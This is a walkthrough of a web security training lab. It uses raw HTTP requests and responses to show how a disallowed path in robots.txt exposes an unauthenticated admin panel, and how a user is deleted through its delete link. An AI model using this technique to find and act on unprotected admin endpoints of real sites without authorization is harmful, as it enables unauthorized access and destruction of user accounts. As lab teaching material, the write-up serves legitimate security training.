## Lab: Unprotected admin functionality

This lab has an unprotected admin panel.

Solve the lab by deleting the user `carlos`.

## Solution:
We enter the site and sends the request to repeater and first action is to request robots.txt.
Request:
```http
GET /robots.txt HTTP/2
Host: 0ab5004c039c609481a32f0f00210040.web-security-academy.net
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
```
Response:
```http
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
Set-Cookie: session=1Upan7uS63a4DAqTMfwhu59vMYz4PDqE; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 45

User-agent: *
Disallow: /administrator-panel

```

Here we find the ```/administrator-panel``` and send a request there.
Request:
```http
GET /administrator-panel HTTP/2
Host: 0ab5004c039c609481a32f0f00210040.web-security-academy.net
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```
Response:
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
Set-Cookie: session=k2OK2lD45dR42kb5XpanNo70p8NRJxFm; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 3034

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Unprotected admin functionality</title>
    </head>
**********SNIP**********
                    <section>
                        <h1>Users</h1>
                        <div>
                            <span>wiener - </span>
                            <a href="/administrator-panel/delete?username=wiener">Delete</a>
                        </div>
                        <div>
                            <span>carlos - </span>
                            <a href="/administrator-panel/delete?username=carlos">Delete</a>
                        </div>
                    </section>
                    <br>
                    <hr>
                </div>
            </section>
**********SNIP**********
</html>
```

In the html snippet we find the a tag with a href attribute pointing to /delete with a query string pointing to a username to delete.

We make a request to the a tag.
```http
HTTP/2 302 Found
Location: /administrator-panel
Set-Cookie: session=6QC0cViVhZZlzgl0x73AoKJaAKg7k5tI; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```
We get a 302 which redirects us back to the admin panel with the message
![](Deleted_User_Successfully.png)